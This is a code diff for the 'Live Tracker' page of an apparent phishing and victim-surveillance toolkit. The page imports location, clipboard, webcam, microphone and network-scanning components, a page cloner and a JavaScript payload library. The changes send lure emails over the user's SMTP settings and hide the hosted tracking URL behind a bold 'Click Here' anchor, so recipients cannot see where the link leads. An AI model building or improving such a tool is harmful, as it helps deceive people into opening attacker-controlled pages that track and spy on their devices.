@@ -10,7 +10,7 @@ import { LocationTracker } from '@/components/location-tracker';
 import { InternalNetworkScannerResults } from '@/components/internal-network-scanner-results';
 import { PortScannerResults } from '@/components/port-scanner-results';
 import { ClipboardMonitor } from '@/components/clipboard-monitor';
-import { SessionHistory } from '@/components/session-history';
+import { SessionHistory } from '@/components/live-tracker/session-history';
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
 import { Webcam, Video, Mic, Terminal, Info, Mail, Sparkles, Send as SendIcon, Save, PlusCircle } from 'lucide-react';
@@ -23,7 +23,7 @@ import { Textarea } from '@/components/ui/textarea';
 import { Label } from '@/components/ui/label';
 import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
 import type { JsPayload } from '@/types';
-import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
+import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from '@/components/ui/dialog';
 import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { Input } from '@/components/ui/input';
@@ -35,14 +35,8 @@ import { useForm } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
 import { z } from 'zod';
 import { ScrollArea } from '@/components/ui/scroll-area';
+import { initialTemplates, type Template } from '@/lib/templates';
 
-type Template = {
-  id: string;
-  name: string;
-  type: 'Email' | 'SMS';
-  subject?: string;
-  body: string;
-};
 
 const emailFormSchema = z.object({
   recipientEmail: z.string().email(),
@@ -223,8 +217,9 @@ export default function LiveTrackerPage() {
   // --- Email Functionality ---
   const openEmailModal = (url: string) => {
     setHostedUrlForEmail(url);
-    const storedTemplates = JSON.parse(localStorage.getItem('netra-templates') || '[]');
-    setEmailTemplates(storedTemplates.filter((t: Template) => t.type === 'Email'));
+    const storedTemplates = localStorage.getItem('netra-templates');
+    const allTemplates = storedTemplates ? JSON.parse(storedTemplates) : initialTemplates;
+    setEmailTemplates(allTemplates.filter((t: Template) => t.type === 'Email'));
     const storedSmtp = JSON.parse(localStorage.getItem('netra-email-settings') || 'null');
     setSmtpConfig(storedSmtp);
     setSelectedTemplate(null);
@@ -275,8 +270,8 @@ export default function LiveTrackerPage() {
 
     setIsSendingEmail(true);
     try {
-      let body = selectedTemplate.body.replace(/\[Link\]/gi, hostedUrlForEmail);
-      body = body.replace(/\{\{\s*link\s*\}\}/gi, hostedUrlForEmail);
+      let body = selectedTemplate.body.replace(/\[Link\]/gi, `<a href="${hostedUrlForEmail}" target="_blank" rel="noopener noreferrer" style="color:hsl(var(--accent));font-weight:bold;text-decoration:underline;">Click Here</a>`);
+      body = body.replace(/\{\{\s*link\s*\}\}/gi, `<a href="${hostedUrlForEmail}" target="_blank" rel="noopener noreferrer" style="color:hsl(var(--accent));font-weight:bold;text-decoration:underline;">Click Here</a>`);
 
       await sendTestEmail({
         ...smtpConfig,
@@ -349,7 +344,7 @@ export default function LiveTrackerPage() {
           <JavaScriptLibrary onSelectPayload={handleSelectPayload}/>
         </div>
         <div className="xl:col-span-1 flex flex-col gap-6">
-          <SessionHistory sessions={sessionsMap} setSessions={setSessionsFromMap} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
+          <SessionHistory sessions={sessionsMap} setSessions={setSessions} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
           
             <Card className="bg-primary/10">
               <CardHeader>
@@ -456,7 +451,7 @@ export default function LiveTrackerPage() {
                   {!selectedTemplate ? <p className="text-muted-foreground text-center pt-20">Select or generate a template.</p> : (
                     <div className="prose prose-sm dark:prose-invert">
                       <h3>{selectedTemplate.subject}</h3>
-                      <div dangerouslySetInnerHTML={{ __html: selectedTemplate.body.replace(/\[Link\]/gi, `<a href='${hostedUrlForEmail}' target='_blank' rel='noopener noreferrer' style='color:hsl(var(--accent));'>${hostedUrlForEmail}</a>`).replace(/\{\{\s*link\s*\}\}/gi, `<a href='${hostedUrlForEmail}' target='_blank' rel='noopener noreferrer' style='color:hsl(var(--accent));'>${hostedUrlForEmail}</a>`)}}/>
+                      <div dangerouslySetInnerHTML={{ __html: selectedTemplate.body.replace(/\[.*?\]/gi, `<a href='${hostedUrlForEmail}' target='_blank' rel='noopener noreferrer' style='color:hsl(var(--accent));font-weight:bold;text-decoration:underline;'>Click Here</a>`).replace(/\{\{\s*link\s*\}\}/gi, `<a href='${hostedUrlForEmail}' target='_blank' rel='noopener noreferrer' style='color:hsl(var(--accent));font-weight:bold;text-decoration:underline;'>Click Here</a>`)}}/>
                     </div>
                   )}
                 </CardContent>
